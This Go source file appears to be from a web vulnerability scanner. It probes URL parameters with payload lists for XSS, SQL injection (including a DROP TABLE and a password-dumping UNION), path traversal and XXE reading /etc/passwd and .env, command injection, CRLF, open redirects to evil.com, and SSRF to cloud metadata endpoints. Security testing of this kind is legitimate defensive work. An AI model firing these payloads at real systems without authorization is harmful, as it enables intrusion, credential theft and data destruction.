package scanner

import (
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"

	"agente-seguridad/internal/models"
)

var (
	xssPayloads = []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"'><script>alert('XSS')</script>",
		"\"><script>alert('XSS')</script>",
		"javascript:alert('XSS')",
		"<svg/onload=alert('XSS')>",
		"';alert('XSS');//",
		"\";alert('XSS');//",
		"<body onload=alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
	}
	sqlPayloads = []string{
		"' OR '1'='1", "' OR 1=1 --", "'; DROP TABLE users; --",
		"' UNION SELECT NULL,username,password FROM users --",
		"' AND 1=1 --", "' AND 1=2 --", "' OR SLEEP(5) --",
		"'; WAITFOR DELAY '0:0:5' --", "' OR 1=1#", "' OR 1=1--",
	}
	pathPayloads = []string{
		"../../../../etc/passwd", "../../../etc/shadow", "../../../../etc/hosts",
		"/etc/passwd", "..\\..\\..\\windows\\win.ini",
		"C:\\Windows\\System32\\drivers\\etc\\hosts",
		"....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
		"../../../../.htaccess", "../../../../.env",
	}
	sstiPayloads  = []string{"{{7*7}}", "${7*7}", "{{7*'7'}}", "<%= 7*7 %>", "{{config}}", "{{self.__class__.__mro__}}"}
	lfiPayloads   = []string{"../../etc/passwd", "../../../etc/passwd", "/etc/passwd", "file:///etc/passwd", "php://filter/convert.base64-encode/resource=index.php"}
	cmdPayloads   = []string{"; id", "| id", "|| id", "& id", "&& id", "`id`", "$(id)"}
	crlfPayloads  = []string{"%0d%0aSet-Cookie: hacked=1", "%0d%0a%0d%0a<script>alert('XSS')</script>", "%0aSet-Cookie: sessionid=evil"}
	redirPayloads = []string{"//evil.com", "https://evil.com", "http://evil.com", "//evil.com/%2f.."}
	xxePayloads   = []string{`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>`}
	ssrfPayloads  = []string{"http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/", "http://127.0.0.1:8080/admin", "http://localhost:3306", "file:///etc/passwd"}

	reSQL = []*regexp.Regexp{
		regexp.MustCompile(`(?i)SQL syntax`), regexp.MustCompile(`(?i)MySQLSyntaxErrorException`),
		regexp.MustCompile(`(?i)Warning: mysql_fetch`), regexp.MustCompile(`ORA-\d{5}`),
		regexp.MustCompile(`(?i)PostgreSQL.*ERROR`), regexp.MustCompile(`Unclosed quotation mark`),
		regexp.MustCompile(`(?i)You have an error in your SQL syntax`),
	}
	rePath = []*regexp.Regexp{
		regexp.MustCompile(`root:x:\d+`), regexp.MustCompile(`\[extensions\]`),
		regexp.MustCompile(`Windows Registry Editor`), regexp.MustCompile(`#!\/bin\/bash`),
		regexp.MustCompile(`mysql_connect`),
	}
	reCmd = []*regexp.Regexp{
		regexp.MustCompile(`uid=\d+\(.*\)`), regexp.MustCompile(`gid=\d+\(.*\)`),
		regexp.MustCompile(`root:`),
	}
)

// defaultParams are used when a URL has no query string params.
var defaultParams = map[string]string{"q": "test", "id": "1", "page": "index"}

// AnalyzeVulnerabilities runs all web vulnerability checks against rawURL.
func AnalyzeVulnerabilities(rawURL string, workers int) models.VulnerabilityMap {
	res := models.VulnerabilityMap{URL: rawURL, Vulnerabilidades: []models.Vulnerabilidad{}}
	params := extractParams(rawURL)

	// These checks run in parallel, each a separate detector; each detector
	// also sweeps over params with a worker pool.
	detectors := []func() []models.Vulnerabilidad{
		func() []models.Vulnerabilidad { return detectXSS(rawURL, params, workers) },
		func() []models.Vulnerabilidad { return detectSQLi(rawURL, params, workers) },
		func() []models.Vulnerabilidad { return detectPath(rawURL, params, workers) },
		func() []models.Vulnerabilidad { return detectSSTI(rawURL, params, workers) },
		func() []models.Vulnerabilidad { return detectLFI(rawURL, params, workers) },
		func() []models.Vulnerabilidad { return detectCmd(rawURL, params, workers) },
		func() []models.Vulnerabilidad { return detectCRLF(rawURL, params, workers) },
		func() []models.Vulnerabilidad { return detectRedirect(rawURL, params, workers) },
		func() []models.Vulnerabilidad { return detectXXE(rawURL, params, workers) },
		func() []models.Vulnerabilidad { return detectSSRF(rawURL, params, workers) },
	}

	var mu sync.Mutex
	var wg sync.WaitGroup
	for _, d := range detectors {
		wg.Add(1)
		go func(fn func() []models.Vulnerabilidad) {
			defer wg.Done()
			for _, v := range fn() {
				mu.Lock()
				res.Vulnerabilidades = append(res.Vulnerabilidades, v)
				mu.Unlock()
			}
		}(d)
	}
	wg.Wait()

	// Header security check.
	for _, v := range detectSecurityHeaders(rawURL) {
		res.Vulnerabilidades = append(res.Vulnerabilidades, v)
	}

	for _, v := range res.Vulnerabilidades {
		switch v.Severidad {
		case "Crítica":
			res.Criticas++
		case "Alta":
			res.Altas++
		case "Media":
			res.Medias++
		case "Baja":
			res.Bajas++
		}
	}
	res.Total = len(res.Vulnerabilidades)
	return res
}

func extractParams(rawURL string) map[string]string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return copyMap(defaultParams)
	}
	m := map[string]string{}
	if u.RawQuery != "" {
		for _, pair := range strings.Split(u.RawQuery, "&") {
			kv := strings.SplitN(pair, "=", 2)
			if len(kv) == 2 {
				m[kv[0]] = kv[1]
			}
		}
	}
	if len(m) == 0 {
		return copyMap(defaultParams)
	}
	return m
}

func copyMap(in map[string]string) map[string]string {
	out := map[string]string{}
	for k, v := range in {
		out[k] = v
	}
	return out
}

// getWithParams makes a GET request overriding the given param with payload.
func getWithParams(client *http.Client, rawURL string, param, payload string, noRedirect bool) (*http.Response, string) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, ""
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, ""
	}
	req.Header = BaseHeaders()
	c := client
	if noRedirect {
		c = &http.Client{Timeout: client.Timeout, Transport: client.Transport, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }}
	}
	resp, err := c.Do(req)
	if err != nil {
		return nil, ""
	}
	body := readBody(resp)
	resp.Body.Close()
	return resp, body
}

// sweepParams iterates params x payloads invoking probe, stopping a param's
// sweep on the first hit.
func sweepParams(rawURL string, params map[string]string, payloads []string, workers int,
	probe func(rawURL string, param, payload string) (models.Vulnerabilidad, bool)) []models.Vulnerabilidad {

	var mu sync.Mutex
	var out []models.Vulnerabilidad
	var wg sync.WaitGroup
	sem := make(chan struct{}, workers)
	for param := range params {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			for _, payload := range payloads {
				v, found := probe(rawURL, p, payload)
				if found {
					mu.Lock()
					out = append(out, v)
					mu.Unlock()
					return
				}
			}
		}(param)
	}
	wg.Wait()
	return out
}

func containsAny(body string, subs ...string) bool {
	for _, s := range subs {
		if strings.Contains(body, s) {
			return true
		}
	}
	return false
}

func matchAny(body string, res []*regexp.Regexp) bool {
	for _, r := range res {
		if r.MatchString(body) {
			return true
		}
	}
	return false
}

func readBody(resp *http.Response) string {
	buf := make([]byte, 0, 8192)
	tmp := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(tmp)
		buf = append(buf, tmp[:n]...)
		if err != nil {
			break
		}
	}
	return string(buf)
}

func truncateStr(s string, n int) string {
	if len(s) > n {
		return s[:n]
	}
	return s
}
